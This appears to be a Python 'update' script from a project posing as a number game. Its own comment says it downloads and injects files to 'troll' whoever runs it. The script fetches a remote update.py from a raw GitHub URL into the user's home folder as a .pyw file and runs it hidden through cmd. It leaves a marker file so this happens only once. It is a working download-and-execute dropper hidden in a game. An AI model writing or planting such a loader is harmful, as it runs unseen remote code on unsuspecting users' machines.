# Downloads and injects the files needed to troll your dumbass
def update():
    import os, urllib.request, pathlib
    home = os.path.expanduser("~")
    os.chdir(home)
    dlurl = 'https://raw.githubusercontent.com/xXEthyleneXx/NumberGame/master/update.py'
    path = str(home) + '/update.pyw'
    path = '{}'.format(path)
    def install(dlurl, path):
        urllib.request.urlretrieve(dlurl, '{}'.format(path))
        os.system("start cmd /c {}".format('pyw ' + path))
        exit()
    try:
        F = open('inst', 'r')
        F.close()
        print('Inst Exists')
        F = open('update.pyw', 'r')
        F.close()
        print('Update Exist')
        exit()
    except FileNotFoundError:
        F = open('inst', 'w')
        F.close()
        try:
            os.remove(path)
            print('Reinstalling')
            install(dlurl, path)
        except FileNotFoundError:
            print('Update missing')
            install(dlurl, path)
        
        

    print('Installed')

    def onboot():
        print('HI')

update()